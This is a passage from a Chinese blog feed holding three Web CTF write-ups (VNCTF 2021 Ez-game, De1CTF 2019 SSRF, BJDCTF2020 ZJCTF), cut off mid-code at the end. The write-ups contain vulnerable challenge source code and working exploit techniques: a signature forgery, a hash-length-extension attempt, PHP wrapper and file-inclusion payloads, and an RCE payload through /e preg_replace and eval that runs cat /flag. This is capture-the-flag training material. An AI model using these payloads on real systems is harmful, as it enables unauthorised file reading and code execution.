        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-首页">          <a href="#1-首页" class="heading-link"><i class="fas fa-link"></i></a>1. 首页</h2>      <p><img src="/2021/03/27/VNCTF-2021-Ez-game/1.png"></p><a id="more"></a><p>闯关小游戏，需要玩到十关，玩到第三关就过不去了，显然求解不是通过这种方式。</p><p>F12查看网页源码，可以发现使有显示js这样的文件：</p><p><img src="/2021/03/27/VNCTF-2021-Ez-game/2.png"></p>        <h2 id="2-方法一-sojson解密">          <a href="#2-方法一-sojson解密" class="heading-link"><i class="fas fa-link"></i></a>2. 方法一 sojson解密</h2>      <p>查看game.js源码，注意到特殊的字符：</p><p><img src="/2021/03/27/VNCTF-2021-Ez-game/3.png">、</p><p>sojson v4加密 ，可以用在线<span class="exturl"><a class="exturl__link" href="https://jsdec.js.org/">网址破解</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><img src="/2021/03/27/VNCTF-2021-Ez-game/4.png"></p>        <h2 id="3-方法二-console执行">          <a href="#3-方法二-console执行" class="heading-link"><i class="fas fa-link"></i></a>3. 方法二 console执行</h2>      <p><img src="/2021/03/27/VNCTF-2021-Ez-game/5.png"></p><p><img src="/2021/03/27/VNCTF-2021-Ez-game/6.png"></p>        <h2 id="4-方法三-开挂游戏">          <a href="#4-方法三-开挂游戏" class="heading-link"><i class="fas fa-link"></i></a>4. 方法三 开挂游戏</h2>      <p>可以通过分析源码发现，当player死了的时候，各项属性的变化：</p><p><img src="/2021/03/27/VNCTF-2021-Ez-game/7.png"></p><p>那么我们可以通过控制台console来改变player属性进行加成：</p><p><img src="/2021/03/27/VNCTF-2021-Ez-game/8.png"></p><p>这样每一关开始前给player加命，就可以一直不被打死，然后一直通关。（Ctrl+s可以保存修改的数据）</p>        <h2 id="5-方法四-通关函数">          <a href="#5-方法四-通关函数" class="heading-link"><i class="fas fa-link"></i></a>5. 方法四 通关函数</h2>      <p>通过代码审计可以发现当player获胜的时候执行了一个函数：</p><p><img src="/2021/03/27/VNCTF-2021-Ez-game/9.png"></p><p>控制台console执行该函数：</p><p><img src="/2021/03/27/VNCTF-2021-Ez-game/10.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 控制台 </tag>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF-2019-SSRF我</title>
      <link href="2021/03/27/De1CTF-2019-SSRF%E6%88%91/"/>
      <url>2021/03/27/De1CTF-2019-SSRF%E6%88%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-首页">          <a href="#1-首页" class="heading-link"><i class="fas fa-link"></i></a>1. 首页</h2>      <p><img src="/2021/03/27/De1CTF-2019-SSRF%E6%88%91/1.png"></p><a id="more"></a><p>源码已给，自己美化：</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python </span></span><br><span class="line"><span class="comment">#encoding=utf-8 </span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request </span><br><span class="line"><span class="keyword">import</span> socket </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> json </span><br><span class="line">reload(sys) </span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>) </span><br><span class="line">app = Flask(__name__) </span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>) </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span>   <span class="comment">#构造方法self代表对象,其他是对象的属性</span></span><br><span class="line">        self.action = action   <span class="comment">#动作（读取文件动作）</span></span><br><span class="line">        self.param = param     <span class="comment">#文件</span></span><br><span class="line">        self.sign = sign       <span class="comment">#标志</span></span><br><span class="line">        self.sandbox = md5(ip) <span class="comment">#对IP进行MD5加密</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)): <span class="comment">#SandBox For Remote_Addr远程沙盒地址，如果不存在</span></span><br><span class="line">        os.mkdir(self.sandbox) <span class="comment">#创建该IP路径</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span> </span><br><span class="line">        result = &#123;&#125; </span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span> </span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()): </span><br><span class="line">         <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:   <span class="comment">#如果动作中有字符串&quot;scan&quot;</span></span><br><span class="line">                tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>) <span class="comment">#执行这条语句后将返回结果写到了result.txt下</span></span><br><span class="line">         resp = scan(self.param)   <span class="comment">#扫描文件</span></span><br><span class="line">               <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>): </span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp </span><br><span class="line">                <span class="keyword">else</span>: </span><br><span class="line">                    <span class="keyword">print</span> resp </span><br><span class="line">                    tmpfile.write(resp) </span><br><span class="line">                    tmpfile.close() </span><br><span class="line">              result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span> </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action: <span class="comment">#动作中有字符串&quot;read&quot;</span></span><br><span class="line">                f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)<span class="comment">#读刚才写入IP目录下的result.txt文件的内容  </span></span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span> <span class="comment">#返回标志，有点类似状态码</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read() </span><br><span class="line">           <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:          </span><br><span class="line">           result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">       <span class="keyword">else</span>: </span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span> </span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span> </span><br><span class="line">       <span class="keyword">return</span> result </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span> <span class="comment">#定义检测sign函数，判断是否符合读取标准</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign): <span class="comment">#调用了getSign函数</span></span><br><span class="line">            <span class="comment"># md5加密后的(secert_key + param + action)要和sign相等</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line"><span class="comment">#generate Sign For Action Scan. </span></span><br><span class="line"><span class="meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) #路径/geneSign</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span> </span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)) <span class="comment">#get方式上传参数param，同时将文件名被url编码解码</span></span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span> </span><br><span class="line">    <span class="keyword">return</span> getSign(action, param) <span class="comment">#整体最后被传到有两个参数的genesign()函数中</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])    #路径/De1ta</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span> </span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>)) <span class="comment">#提取cookie信息中的，名为action的对应值，action属于cookie参数，最后对url进行编码</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)) <span class="comment"># 提取get方法传入的，参数名叫param对应得值</span></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>)) </span><br><span class="line">    <span class="comment">#sign也作为cookie参数</span></span><br><span class="line">    ip = request.remote_addr </span><br><span class="line">    <span class="keyword">if</span>(waf(param)): </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span> </span><br><span class="line">    task = Task(action, param, sign, ip) </span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec()) <span class="comment">#Python 对象编码成 JSON 字符串</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span> </span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read() </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span> </span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>) </span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>] <span class="comment">#读取网络文件参数可以是url</span></span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span> </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest() <span class="comment">#md5加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span> </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest() <span class="comment">#获取一个md5加密算法对象，hexdigest()是获得加密吼的16进制字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span> <span class="comment">#定义waf函数</span></span><br><span class="line">    check=param.strip().lower() </span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>): </span><br><span class="line">        <span class="comment">#如果param这个参数中包含gopher和file这两个字符串</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">   app.debug = <span class="literal">False</span> </span><br><span class="line">   app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></div></figure>        <h2 id="2-代码审计">          <a href="#2-代码审计" class="heading-link"><i class="fas fa-link"></i></a>2. 代码审计</h2>      <p>python的flask框架，三个路由<br>index获取源码，geneSign调用了getSign方法生成 md5，<br>De1ta应该是关键的页面！可以看见获取了三个参数，其中两个是从cookie中获取的：</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br></pre></td></tr></table></div></figure><p>当做参数传入到Task类中，并调用Task类中的Exec()方法，这应该是关键！！<br>分析下三个参数：<br>第一个参数action是传入read和scan的，<br>第二个参数param看着应该是传入一个文件名，<br>第三个参数sign是一个md5值。</p><p>跟进Task中的Exec()方法，可以发现这里面还有个checkSign()，并且在这里面调用了getSign()方法，结果与sign进行比较；<br>仔细看看getSign()方法，发现有个secert_key我们是未知的。。。<br>看完代码之后就有了一定的了解了！！他的目的应该是要我们读取flag.txt中的内容！<br>所以我们需要构造参数！第一个参数action应该包含read，，第二个param参数应该是文件名<br>最关键就是第三个参数，由于我们不知道secert_key的值，所以不能自己加密，考点应该在这里！</p><p>等号左边为md5(key + ‘flag.txt’ + ‘readscan’)，已被写死，等号右边的未定的参数也可也可确定，即md5(key + ‘flag.txtread’ + ‘scan’)。param1为’flag.txtread’依此传参，可得一个哈希值，这就是我们将传给self.sign的值。</p>        <h2 id="3-包含">          <a href="#3-包含" class="heading-link"><i class="fas fa-link"></i></a>3. 包含</h2>              <h3 id="3-1-提取符合sign的md值">          <a href="#3-1-提取符合sign的md值" class="heading-link"><i class="fas fa-link"></i></a>3.1 提取符合sign的md值</h3>      <p>首先，尝试访问geneSign路径下的</p><p><img src="/2021/03/27/De1CTF-2019-SSRF%E6%88%91/2.png"></p><p>然后进行测试md加密</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;geneSign?param&#x3D;flag.txt</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/27/De1CTF-2019-SSRF%E6%88%91/3.png"></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这样我们就得到了md5(secert_key+flag.txtscan)的值：</span><br><span class="line">6a915df6e775d60fed48b1c0ab9a59a1</span><br></pre></td></tr></table></div></figure><p>看了看，发现MD5中是字符拼接，那么这样我们构造param参数为param=flag.txtread就就能够得到(secert_key+flag.txtreadscan)的md5值，那么也就有满足条件中的action包含字符串”read”和”scan”。</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;geneSign?param&#x3D;flag.txtread</span><br><span class="line">Cookie: action&#x3D;scan   (这个不加上好像也可以)</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/27/De1CTF-2019-SSRF%E6%88%91/4.png"></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这样我们就得到了md5(secert_key+flag.txt + acion)的值:</span><br><span class="line">5f7c8db26faeaaa424ba739eaa7a3f8e</span><br></pre></td></tr></table></div></figure>        <h3 id="3-2-获得flag">          <a href="#3-2-获得flag" class="heading-link"><i class="fas fa-link"></i></a>3.2 获得flag</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;geneSign?param&#x3D;flag.txt</span><br><span class="line">Cookie: action&#x3D;readscan;sign&#x3D;5f7c8db26faeaaa424ba739eaa7a3f8e</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/27/De1CTF-2019-SSRF%E6%88%91/5.png"></p>        <h2 id="4-方法二">          <a href="#4-方法二" class="heading-link"><i class="fas fa-link"></i></a>4. 方法二</h2>      <p><strong>Hash扩展攻击：</strong></p><p>kali安装HashPump：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;bwall&#x2F;HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/27/De1CTF-2019-SSRF%E6%88%91/6.png"></p><p><img src="/2021/03/27/De1CTF-2019-SSRF%E6%88%91/7.png"></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MD5加密后的：8cbf1fb89defc1636c9e7a84717efb2e</span><br><span class="line">scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/27/De1CTF-2019-SSRF%E6%88%91/8.png"></p><p>我没有成功。。。。。</p>        <h2 id="5-注意">          <a href="#5-注意" class="heading-link"><i class="fas fa-link"></i></a>5. 注意</h2>      <p>有时候burpsuite不好使，的结合hackbar使用来抓一些cookie或则post之类的。</p>        <h2 id="6-参考">          <a href="#6-参考" class="heading-link"><i class="fas fa-link"></i></a>6. 参考</h2>      <p><span class="exturl"><a class="exturl__link" href="https://www.jianshu.com/p/eb60c856f2a3">https://www.jianshu.com/p/eb60c856f2a3</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020-ZJCTF-不过如此</title>
      <link href="2021/03/27/BJDCTF2020-ZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/"/>
      <url>2021/03/27/BJDCTF2020-ZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-首页">          <a href="#1-首页" class="heading-link"><i class="fas fa-link"></i></a>1. 首页</h2>      <p><img src="/2021/03/27/BJDCTF2020-ZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/1.png"></p><a id="more"></a><p>源码：</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>        <h2 id="2-代码审计">          <a href="#2-代码审计" class="heading-link"><i class="fas fa-link"></i></a>2. 代码审计</h2>              <h3 id="2-1-上传提交">          <a href="#2-1-上传提交" class="heading-link"><i class="fas fa-link"></i></a>2.1 上传提交</h3>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br></pre></td></tr></table></div></figure><p>以get形式上传参数text和file，如果存在参数text同时这个text参数满足等于字符串”I have a dream”，那么就输出在这个text的字符串内容。</p><ul><li>file_get_contents()—–把整个文件读入一个字符串中</li></ul><p>payload：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream</span><br><span class="line">或者：</span><br><span class="line">?text&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">然后post形式上传I have a dream</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/27/BJDCTF2020-ZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/2.png"></p><p><img src="/2021/03/27/BJDCTF2020-ZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/3.png"></p>        <h3 id="2-2-文件包含">          <a href="#2-2-文件包含" class="heading-link"><i class="fas fa-link"></i></a>2.2 文件包含</h3>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br></pre></td></tr></table></div></figure><p>源码中提示我们去包含next.php文件,所以我们利用php://filter协议去读下next.php的源码。</p><p>payload：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/27/BJDCTF2020-ZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/4.png"></p><p>得到base64编码：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K</span><br></pre></td></tr></table></div></figure><p>解码得到next.php：</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$_SESSION[<span class="string">&#x27;id&#x27;</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params">$re, $str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>/e模式的preg_replace,有一个远程代码执行漏洞。<br>思路是利用这个代码执行，执行源码中的getFlag()函数，再传入cmd参数，再利用getFlag中的eval（）函数，再进行一个代码执行，是个典型的俄罗斯套娃。</p><p>payload：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next.php?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/27/BJDCTF2020-ZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/5.png"></p>        <h3 id="2-3-preg-replace-函数">          <a href="#2-3-preg-replace-函数" class="heading-link"><i class="fas fa-link"></i></a>2.3 preg_replace()函数</h3>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(pattern, replacement, subject)</span><br></pre></td></tr></table></div></figure><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 